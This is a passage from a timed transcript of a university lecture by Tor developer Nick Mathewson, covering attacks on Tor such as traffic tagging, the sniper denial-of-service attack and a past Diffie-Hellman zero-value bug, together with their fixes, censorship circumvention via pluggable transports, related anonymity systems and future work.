              <time_slice>1:03:56</time_slice>
              <text_slice>then a hostile exit
node, just like anyone</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:59</time_slice>
              <text_slice>else who touches HTTP traffic,
can observe and modify</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:02</time_slice>
              <text_slice>the traffic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:04</time_slice>
              <text_slice>This is the number one
attack on the whole system.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:08</time_slice>
              <text_slice>The solution is
encrypted traffic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:10</time_slice>
              <text_slice>Fortunately, we're kind of
in an encryption renaissance</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:13</time_slice>
              <text_slice>over the last few years.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>And more and more
traffic is getting</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:16</time_slice>
              <text_slice>encrypted with the nifty
free certificate authority</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:21</time_slice>
              <text_slice>that EFF and Mozilla and Cisco
and I forget who else announced</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:25</time_slice>
              <text_slice>a day or two ago.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:26</time_slice>
              <text_slice>There will be even less excuse
for unencrypted traffic in 2015</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:29</time_slice>
              <text_slice>than there was this year.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:31</time_slice>
              <text_slice>So that solves that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:33</time_slice>
              <text_slice>More interesting attacks include
things like traffic tagging.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:37</time_slice>
              <text_slice>So we made a mistake in our
early integrity checking</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:44</time_slice>
              <text_slice>implementation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:44</time_slice>
              <text_slice>Our early integrity
checking implementation</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:47</time_slice>
              <text_slice>did end to end checking between
Alice's program and the exit</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:55</time_slice>
              <text_slice>node.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:56</time_slice>
              <text_slice>But it turns out that
that's not enough.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>Because if the
first relay messes</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:02</time_slice>
              <text_slice>with the traffic in a way that
creates a pattern that the exit</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:07</time_slice>
              <text_slice>node can detect, then
that's an easy way</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:10</time_slice>
              <text_slice>for the first relay
and the last relay</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:12</time_slice>
              <text_slice>to learn that they are on the
same path and identify Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:17</time_slice>
              <text_slice>Of course, if the first
relay and the last relay</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:20</time_slice>
              <text_slice>happen to be on the
same path, happen</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:23</time_slice>
              <text_slice>to be collaborating anyway,
then they can already</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:25</time_slice>
              <text_slice>identify Alice through traffic
correlation, we believe.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:30</time_slice>
              <text_slice>But perhaps it should not
be so easy for them as that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:34</time_slice>
              <text_slice>Perhaps traffic
correlation will someday</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:36</time_slice>
              <text_slice>be harder than we think.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:38</time_slice>
              <text_slice>It would be good to actually
solve that attack for real.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:41</time_slice>
              <text_slice>We've got two
solutions for that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:43</time_slice>
              <text_slice>One is the expected
result of this attack</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:46</time_slice>
              <text_slice>is that periodically
circuits will fail.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:48</time_slice>
              <text_slice>Because the attacker
on the first hop</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:50</time_slice>
              <text_slice>guessed wrong about
controlling the last hop.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:53</time_slice>
              <text_slice>So every Tor client checks
for weird failure rates.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:59</time_slice>
              <text_slice>The real long-term
fix is to make it</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:00</time_slice>
              <text_slice>so that messing with the
pattern on the first hop</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:04</time_slice>
              <text_slice>doesn't create more than 1 bit
of information on the last hop.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:07</time_slice>
              <text_slice>You can't avoid sending
1 bit of information,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:10</time_slice>
              <text_slice>because the first hop can always
just shut down the connection.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:13</time_slice>
              <text_slice>But you can limit it
to 1 bit-- OK, 2 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:17</time_slice>
              <text_slice>Because then they'll have the
choice to corrupt the data</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:19</time_slice>
              <text_slice>or shut down the connection.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:23</time_slice>
              <text_slice>Oh, I had an idea of
how to make that better.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>I'll have to think about that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:28</time_slice>
              <text_slice>Let's see, DOS is
actually pretty important.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:32</time_slice>
              <text_slice>There was a paper the
other year about something</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:34</time_slice>
              <text_slice>that the authors called
the sniper attack</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:36</time_slice>
              <text_slice>where you see traffic
coming from a Tor node</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:39</time_slice>
              <text_slice>that you don't control.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:41</time_slice>
              <text_slice>You want to kick everybody
off that Tor node.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:44</time_slice>
              <text_slice>So you connect to it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:45</time_slice>
              <text_slice>You fill up all its memory
buffers, and it crashes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:50</time_slice>
              <text_slice>Then you see whether
the traffic in question</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:52</time_slice>
              <text_slice>gets rerouted to a node
you control or not,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:54</time_slice>
              <text_slice>and you repeat as necessary.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:59</time_slice>
              <text_slice>For that, our best
options are first off,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:02</time_slice>
              <text_slice>no longer have memory DOSes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:05</time_slice>
              <text_slice>I think we have all of the
good memory DOSes fixed now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>There are some bad ones that
still needed to get addressed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:13</time_slice>
              <text_slice>But they're screamingly
inefficient.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:16</time_slice>
              <text_slice>The other option for
resolving this kind of thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:19</time_slice>
              <text_slice>is make sure relays
are high capacity.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:23</time_slice>
              <text_slice>Don't accept low capacity
relays on the network.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:25</time_slice>
              <text_slice>We do that, too.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:26</time_slice>
              <text_slice>If you're trying to run
a relay on your phone,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:30</time_slice>
              <text_slice>the authorities won't list it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:35</time_slice>
              <text_slice>And another thing is to try
to pick our circuit scheduling</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:39</time_slice>
              <text_slice>algorithms so that it's
hard to starve out circuits</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:45</time_slice>
              <text_slice>that you don't control.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:46</time_slice>
              <text_slice>That's very hard,
though, and it's as yet</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:50</time_slice>
              <text_slice>an unsolved problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:52</time_slice>
              <text_slice>Let's see, should I do
an interesting attack</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:55</time_slice>
              <text_slice>or an important attack?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:58</time_slice>
              <text_slice>STUDENT: Interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:59</time_slice>
              <text_slice>NICK MATHEWSON: Interesting, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:01</time_slice>
              <text_slice>So show of hands,
how many people</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:03</time_slice>
              <text_slice>might like to write
a program that</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:04</time_slice>
              <text_slice>uses cryptography some day?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:07</time_slice>
              <text_slice>Cool, here's what
you must learn.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:08</time_slice>
              <text_slice>Never trust your
cryptography implementation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:12</time_slice>
              <text_slice>So even when it's
correct, it's wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:15</time_slice>
              <text_slice>So long ago-- I think this may
be one of the worse security</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:21</time_slice>
              <text_slice>bugs that we've had.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:24</time_slice>
              <text_slice>Any relay could
man in the middle</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:25</time_slice>
              <text_slice>any circuit because we assumed
that a correct Diffie-Hellman</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>implementation would verify
that it was not being passed 0</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:38</time_slice>
              <text_slice>as one of the inputs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>The authors of our
Diffie-Hellman implementation</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:42</time_slice>
              <text_slice>assumed the proper
application would never</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:44</time_slice>
              <text_slice>pass zero to a Diffie-Hellman
implementation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:49</time_slice>
              <text_slice>So Diffie-Hellman, when I say
g to the x, you say g to the y.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:56</time_slice>
              <text_slice>I know x.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:57</time_slice>
              <text_slice>You know y.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:58</time_slice>
              <text_slice>And we can both compute
g to the xy now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:01</time_slice>
              <text_slice>You tend to feel me?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:02</time_slice>
              <text_slice>Good.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:03</time_slice>
              <text_slice>Well, if instead the
man in the middle</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:06</time_slice>
              <text_slice>replaces my g to the x with
0 and your g to the x with 0,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:10</time_slice>
              <text_slice>and then I happily
compute 0 to the x,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:13</time_slice>
              <text_slice>and you compute 0 to the y,
we will have the same key.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:16</time_slice>
              <text_slice>We will happily
talk to each other.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:18</time_slice>
              <text_slice>But this will be a key that the
attacker knows, because it's 0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:22</time_slice>
              <text_slice>1 also works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:25</time_slice>
              <text_slice>p also works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:27</time_slice>
              <text_slice>p plus 1 also works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:29</time_slice>
              <text_slice>So you basically just need to
make sure that your values here</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:33</time_slice>
              <text_slice>are within range 2 and p minus
1 if you're doing Diffie-Hellman</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:37</time_slice>
              <text_slice>in z sub p.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:41</time_slice>
              <text_slice>OK, let's see, I would love
to talk more about censorship.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:47</time_slice>
              <text_slice>Because actually,
it's one of the areas</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:49</time_slice>
              <text_slice>where we can do the most good.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:51</time_slice>
              <text_slice>Generally, the summarized
version of that</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:55</time_slice>
              <text_slice>was, in the earliest
paper you read,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:57</time_slice>
              <text_slice>and in some of the updates,
we were still on the idea</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:59</time_slice>
              <text_slice>that we would try to
make Tor look just</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:01</time_slice>
              <text_slice>like a web client talking
to a web server over HTTPS</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:05</time_slice>
              <text_slice>and make that hard to block.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:06</time_slice>
              <text_slice>It turns out that's
fantastically difficult</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:08</time_slice>
              <text_slice>and probably not worth doing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:10</time_slice>
              <text_slice>Instead, the
approach we take now</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:12</time_slice>
              <text_slice>is using different
plug-in programs</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:15</time_slice>
              <text_slice>that a non-listed relay
called a bridge can use,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>and a client can use
to do different traffic</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:23</time_slice>
              <text_slice>transformations.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:25</time_slice>
              <text_slice>And we manage to keep
adding new ones of those</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:28</time_slice>
              <text_slice>faster than the censors
have been able to implement</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:30</time_slice>
              <text_slice>blocking for them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:32</time_slice>
              <text_slice>And that's actually a case
where none of the solutions</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:38</time_slice>
              <text_slice>are categorically workable.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:42</time_slice>
              <text_slice>That's not a
well-formed sentence.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:44</time_slice>
              <text_slice>None of these plug-ins
are inherently</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:47</time_slice>
              <text_slice>unblockable by any
imaginable technique so far.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:50</time_slice>
              <text_slice>But they're good enough to keep
traffic unblocked for a year</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:53</time_slice>
              <text_slice>or two in most places,
and six or seven</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:56</time_slice>
              <text_slice>months at a time in China.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:59</time_slice>
              <text_slice>China currently has the most
competent censors in the world,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:02</time_slice>
              <text_slice>largely because China
doesn't outsource.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:04</time_slice>
              <text_slice>Most other censoring countries
outsource their censorship</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:08</time_slice>
              <text_slice>to dishonest European, American,
and Asian companies whose</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:12</time_slice>
              <text_slice>incentives are not actually
to sell them good censorship,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:15</time_slice>
              <text_slice>but to keep them on
an upgrade treadmill.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:17</time_slice>
              <text_slice>So if you were buying
your censorship software</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:21</time_slice>
              <text_slice>from the United States--
which technically speaking</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:24</time_slice>
              <text_slice>US companies aren't allowed
to make censorship software</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:27</time_slice>
              <text_slice>for nations.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:29</time_slice>
              <text_slice>But they just make
corporate firewall software</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:32</time_slice>
              <text_slice>that happens to scale
to 10 million people.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:37</time_slice>
              <text_slice>Yeah, I think that's unethical.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:39</time_slice>
              <text_slice>But again, I'm not the political
scientist of the organization,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:41</time_slice>
              <text_slice>or the philosopher.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:43</time_slice>
              <text_slice>Paul Syverson, one of the
original [INAUDIBLE] authors,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:46</time_slice>
              <text_slice>does have a degree
in philosophy,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:47</time_slice>
              <text_slice>for what that's worth,
which means that he can't</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:50</time_slice>
              <text_slice>answer these questions either.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:50</time_slice>
              <text_slice>But he takes a lot longer
not to answer them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:56</time_slice>
              <text_slice>Right, where was I?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:58</time_slice>
              <text_slice>90 minutes is a long time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:01</time_slice>
              <text_slice>Censorship-- right, so what
the censorware providers</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:05</time_slice>
              <text_slice>do is once Tor gets
around their censorship,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:10</time_slice>
              <text_slice>they will block the most
recent version of Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:13</time_slice>
              <text_slice>But they do it in a way that
is the weakest possible block.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:17</time_slice>
              <text_slice>So if we change 1 bit in
one identifier somewhere,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:20</time_slice>
              <text_slice>we get around it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:22</time_slice>
              <text_slice>We can't prove that they're
doing this on purpose</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:25</time_slice>
              <text_slice>to ensure that Tor will evade
their version so that they can</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:30</time_slice>
              <text_slice>sell Tor blocking and then have
it not work so they can sell</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:34</time_slice>
              <text_slice>the upgrade, and then
sell the next upgrade,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:36</time_slice>
              <text_slice>and sell the next upgrade.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:37</time_slice>
              <text_slice>But it sure does seem that way.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:39</time_slice>
              <text_slice>So that's another reason not to
work for censorship providers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:42</time_slice>
              <text_slice>They're tremendously
unethical, and they don't</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:44</time_slice>
              <text_slice>provide very good software.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:48</time_slice>
              <text_slice>If you're interested
in writing any</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:50</time_slice>
              <text_slice>of these plug-able
transport things,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:52</time_slice>
              <text_slice>that is an excellent
kind of thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:54</time_slice>
              <text_slice>to do as a student
project-- loads of fun,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:56</time_slice>
              <text_slice>learn a little bit
about crypto, learn</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>a little bit about networking.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:00</time_slice>
              <text_slice>And so long as you do it
in a memory-safe language,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:02</time_slice>
              <text_slice>you can't screw
it up that badly.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:04</time_slice>
              <text_slice>The worst thing
that happens is it</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:06</time_slice>
              <text_slice>gets censored after a month
instead of after a year.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:10</time_slice>
              <text_slice>And that's what I want to-- oh,
the addenda related to work.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>Tor is the most popular
system of its kind,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:21</time_slice>
              <text_slice>but it's not the only one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:23</time_slice>
              <text_slice>Lots of others have
really good ideas,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:24</time_slice>
              <text_slice>and you should
check them out too</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:26</time_slice>
              <text_slice>if you're interested
in learning all</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:29</time_slice>
              <text_slice>of the stuff I'm
not thinking about</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:31</time_slice>
              <text_slice>and all the reasons I'm wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:33</time_slice>
              <text_slice>freehaven.net/anonbib/
lists the academic research</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:37</time_slice>
              <text_slice>and publications in this area.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:39</time_slice>
              <text_slice>But not all the research
in this area is academic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:42</time_slice>
              <text_slice>You should also
look at I2P; Gnunet;</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:48</time_slice>
              <text_slice>Freedom, which is
currently defunct,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:52</time_slice>
              <text_slice>no pun intended; Mixmaster;
Mixminion; Sphynx with a Y,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:09</time_slice>
              <text_slice>Sphinx with an I is
something different; DC-nets,</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:17</time_slice>
              <text_slice>particularly the work of Brian
Ford, and also of the team</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:25</time_slice>
              <text_slice>at Technical University
Dresden, in trying</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:28</time_slice>
              <text_slice>to make DC-nets practical.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:30</time_slice>
              <text_slice>They're very strong [INAUDIBLE],
not actually deployable</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:32</time_slice>
              <text_slice>yet-- and many others.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:41</time_slice>
              <text_slice>Why these get less use
or attention than Tor</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:44</time_slice>
              <text_slice>is an open topic
of some interest</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:48</time_slice>
              <text_slice>that I don't have
a solid answer for.</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:50</time_slice>
              <text_slice>Future work-- so
one of the reasons</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:55</time_slice>
              <text_slice>I do these is not just
because I would like everybody</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:58</time_slice>
              <text_slice>to know about the cool
software I work on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:00</time_slice>
              <text_slice>But also because I
know students have</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:02</time_slice>
              <text_slice>lots and lots of free time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:05</time_slice>
              <text_slice>And I'm kind of
looking to recruit.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:07</time_slice>
              <text_slice>OK, you may think I'm joking.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:09</time_slice>
              <text_slice>But when I was just getting
started in this field,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:12</time_slice>
              <text_slice>I was complaining about how I
was so busy reviewing papers</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:16</time_slice>
              <text_slice>for one conference, writing
software, fixing a bug,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:19</time_slice>
              <text_slice>answering email.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:19</time_slice>
              <text_slice>I was complaining to some
senior faculty member.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:21</time_slice>
              <text_slice>And he told me, you will
never have so much free time</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:27</time_slice>
              <text_slice>as you do today.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:29</time_slice>
              <text_slice>You actually have
a lot more free</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:31</time_slice>
              <text_slice>time now than you
will in 10 years.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:33</time_slice>
              <text_slice>So this is a great time to work
on crazy software projects.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:37</time_slice>
              <text_slice>So let me tell you about
future work in Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:39</time_slice>
              <text_slice>There's this key blinding
thing and a complete revamp</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:43</time_slice>
              <text_slice>of our hidden
services system, which</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:45</time_slice>
              <text_slice>was the best we could design
when we came up with it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:47</time_slice>
              <text_slice>But there's been a lot
of research since then.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:49</time_slice>
              <text_slice>Maybe some of it will turn
out to be a good idea.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:52</time_slice>
              <text_slice>We're also revamping
most of our crypto.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:54</time_slice>
              <text_slice>We chose schemes that
seemed like a good security</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:58</time_slice>
              <text_slice>performance trade-off
in 2003, like RSA-1024.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:03</time_slice>
              <text_slice>We've replaced the
really important uses</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:05</time_slice>
              <text_slice>of RSA-1024 with stronger stuff,
currently [INAUDIBLE] 25519.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:09</time_slice>
              <text_slice>But there's still
some cases that we</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:11</time_slice>
              <text_slice>want to replace in the protocol
that we need some work on.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:14</time_slice>
              <text_slice>I didn't talk too much
about path selection,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:16</time_slice>
              <text_slice>so I can't talk too much about
improvements in that selection.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:19</time_slice>
              <text_slice>But our path selection
algorithms were [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:24</time_slice>
              <text_slice>And there's been
some awesome research</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:26</time_slice>
              <text_slice>in the past five or six years on
that that we need to integrate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:31</time_slice>
              <text_slice>There's a little
work that's been</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:33</time_slice>
              <text_slice>done on mixing high latency
and low latency traffic so</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:38</time_slice>
              <text_slice>that the low latency
traffic can provide cover</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:41</time_slice>
              <text_slice>for the high latency traffic
in terms of providing lots</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:44</time_slice>
              <text_slice>of users while the high latency
traffic is still very well</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:47</time_slice>
              <text_slice>anonymized.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:50</time_slice>
              <text_slice>It's not clear whether
this would work or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:53</time_slice>
              <text_slice>It's not clear whether
anyone would use this or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:57</time_slice>
              <text_slice>And it is clear that
unless something changes,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:01</time_slice>
              <text_slice>or unless some major funding
for that particularly shows up,</text_slice>
            </slice>
            <slice>
